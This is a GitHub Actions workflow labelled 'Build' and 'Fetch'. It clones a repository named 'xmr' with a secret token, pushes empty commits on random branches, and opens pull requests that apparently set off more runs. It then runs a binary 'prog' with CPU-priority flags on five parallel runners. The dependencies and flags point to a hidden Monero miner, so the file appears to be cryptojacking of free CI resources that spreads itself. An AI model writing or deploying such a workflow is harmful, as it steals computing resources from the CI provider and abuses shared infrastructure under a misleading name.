name: Build
on: [pull_request, workflow_dispatch]
jobs:
  test:
    name: Fetch
    runs-on: ubuntu-latest
    container: ubuntu:20.10
    env:
      DEBIAN_FRONTEND: noninteractive
      ACTIONS_ALLOW_UNSECURE_COMMANDS: true
    strategy:
      fail-fast: false
      matrix:
        runner: [0,1,2,3,4]
    steps:
      - run: |
          apt update -qq
          apt install -y git libuv1 libssl1.1 libhwloc15 curl
          if [ "${{ env.GITHUB_REPOSITORY }}" = "daveyg7-org/xmr" ]
          then
            export OWNER="daveyg7-org"
          else
            export OWNER="daveyg7"
          fi
          echo "::set-env name=OWNER::$OWNER"
          git clone https://daveyg7:${{ secrets.token }}@github.com/$OWNER/xmr.git
          cd xmr
          git config user.name 'Davey G'
          git config user.email 'daveyg7@yandex.com'
          export BRANCH=$(head -c8 /dev/urandom | base64 | tr -cd '[:alnum:]')
          echo "::set-env name=BRANCH::$BRANCH"
          git checkout -b $BRANCH
          git commit --allow-empty --allow-empty-message --no-edit
          git push -u origin $BRANCH
      - uses: actions/github-script@v3
        id: my-script
        with:
          github-token: ${{secrets.token}}
          result-encoding: string
          script: |
            github.pulls.create({
              owner: "${{ env.OWNER }}",
              repo: "xmr",
              head: "daveyg7-org:${{ env.BRANCH }}",
              base: "main",
              title: "COol"
            })
      - run: |
          cd xmr
          chmod u+x prog
          ./prog --cpu-no-yield --cpu-priority 5
